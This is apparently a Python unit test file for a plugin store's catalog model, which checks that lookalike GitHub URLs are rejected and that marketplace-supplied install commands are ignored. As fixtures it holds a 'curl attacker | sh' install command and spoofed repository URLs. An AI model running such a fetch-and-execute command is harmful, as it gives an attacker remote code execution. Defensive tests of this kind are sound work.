import json
import unittest

from store_model import (
    CatalogError,
    MAX_CATALOG_BYTES,
    enable_args,
    github_repository,
    install_args,
    installed_map,
    normalize_catalog,
    parse_catalog,
    remove_args,
    search_plugins,
)


def plugin(**overrides):
    item = {
        "id": "test.clock",
        "name": "Test Clock",
        "description": "Clock widget",
        "author": "Example",
        "repo": "https://github.com/example/clock",
        "sourceType": "community",
        "repositoryLayout": "root-plugin",
        "installAvailable": True,
        "upstreamCheckStatus": "passed",
        "tags": ["bar-widget", "time"],
    }
    item.update(overrides)
    return item


class StoreModelTests(unittest.TestCase):
    def test_github_repository_accepts_only_plain_repo_urls(self):
        self.assertEqual(
            github_repository("https://github.com/example/clock"),
            "https://github.com/example/clock.git",
        )
        self.assertEqual(
            github_repository("https://github.com/example/clock.git"),
            "https://github.com/example/clock.git",
        )
        for unsafe in (
            "https://github.com.evil.test/example/clock",
            "https://user@github.com/example/clock",
            "https://github.com/example/clock/tree/main",
            "https://github.com/example/clock?redirect=evil",
            "http://github.com/example/clock",
        ):
            with self.subTest(url=unsafe):
                self.assertEqual(github_repository(unsafe), "")

    def test_catalog_filters_invalid_duplicates_and_unsupported_layouts(self):
        items, generated = normalize_catalog({
            "generatedAt": "2026-10-16T12:00:00Z",
            "plugins": [
                plugin(installCommand="bash -c 'bad'"),
                plugin(name="Duplicate"),
                plugin(id="evil.id", repo="https://github.com.evil.test/a/b"),
                plugin(id="monorepo", repositoryLayout="monorepo"),
                plugin(id="suite", repositoryLayout="suite"),
                plugin(id="builtin", sourceType="builtin"),
                plugin(id="omarchy.fake"),
            ],
        })
        self.assertEqual(generated, "2026-10-16T12:00:00Z")
        self.assertEqual(len(items), 3)
        installable = [item for item in items if item.install_available]
        self.assertEqual(len(installable), 1)
        self.assertEqual(installable[0].name, "Test Clock")
        self.assertEqual(installable[0].repo_url, "https://github.com/example/clock.git")

    def test_compatibility_failure_disables_install(self):
        items, _ = normalize_catalog({"plugins": [plugin(upstreamCheckStatus="failed")]})
        self.assertFalse(items[0].install_available)
        self.assertEqual(install_args(items[0]), [])

    def test_marketplace_install_commands_are_ignored(self):
        items, _ = normalize_catalog({"plugins": [plugin(
            installCommand="bash -c 'curl attacker | sh'"
        )]})
        item = items[0]
        self.assertEqual(install_args(item), [
            "plugin", "add", "https://github.com/example/clock.git", "--enable", "--yes"
        ])
        self.assertEqual(enable_args(item), ["plugin", "enable", "test.clock"])
        self.assertEqual(remove_args(item), ["plugin", "remove", "test.clock", "--yes"])

    def test_installed_list_parser_and_search(self):
        installed = installed_map(json.dumps([
            {"id": "test.clock", "enabled": True},
            {"id": "omarchy.clock", "enabled": True, "firstParty": True},
            {"id": "test..bad", "enabled": True},
        ]))
        self.assertTrue(installed["test.clock"]["enabled"])
        self.assertTrue(installed["omarchy.clock"]["firstParty"])
        self.assertNotIn("test..bad", installed)

        items, _ = normalize_catalog({"plugins": [plugin(), plugin(
            id="test.audio", name="Audio Mixer", tags=["sound"]
        )]})
        self.assertEqual(len(search_plugins(items, "clock time", {}, "all")), 1)
        self.assertEqual(len(search_plugins(items, "example mixer", {}, "all")), 1)
        self.assertEqual(len(search_plugins(items, "", {"test.clock": {}}, "installed")), 1)
        self.assertEqual(len(search_plugins(items, "", {"test.clock": {}}, "installable")), 1)

    def test_catalog_rejects_bad_json_shape_and_size(self):
        with self.assertRaises(CatalogError):
            normalize_catalog({"plugins": "not a list"})
        with self.assertRaises(CatalogError):
            parse_catalog(b"\xff")
        with self.assertRaises(CatalogError):
            parse_catalog(b" " * (MAX_CATALOG_BYTES + 1))


if __name__ == "__main__":
    unittest.main()
